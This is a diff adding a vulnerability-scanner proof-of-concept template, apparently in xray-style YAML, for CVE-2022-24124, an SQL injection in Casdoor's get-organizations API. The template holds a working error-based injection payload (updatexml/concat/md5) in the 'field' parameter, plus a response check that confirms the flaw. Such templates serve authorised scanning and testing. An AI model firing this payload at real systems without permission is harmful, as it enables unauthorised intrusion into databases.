@@ -1,0 +1,15 @@
+id: poc-yaml-casdoor-api-get-oraganizations-sqli
+info:
+  name: Casdoor api get-oraganizations SQL注入(CVE-2022-24124)
+  severity: high
+  tags:
+  - CVE-2022-24124
+  - 两高一弱
+  finger: casdoor
+variables:
+  t1: random_int(100,1000)
+requests:
+- method: GET
+  path: /api/get-organizations?p=123&pageSize=123&value=cfx&sortField=&sortOrder=&field=updatexml(1,concat(0x7e,md5({{.t1}})),1)
+  expression: status_code == 200 && contains(body,"XPATH syntax error") && contains(body,substr(md5(t1),1,27))
+transport: http
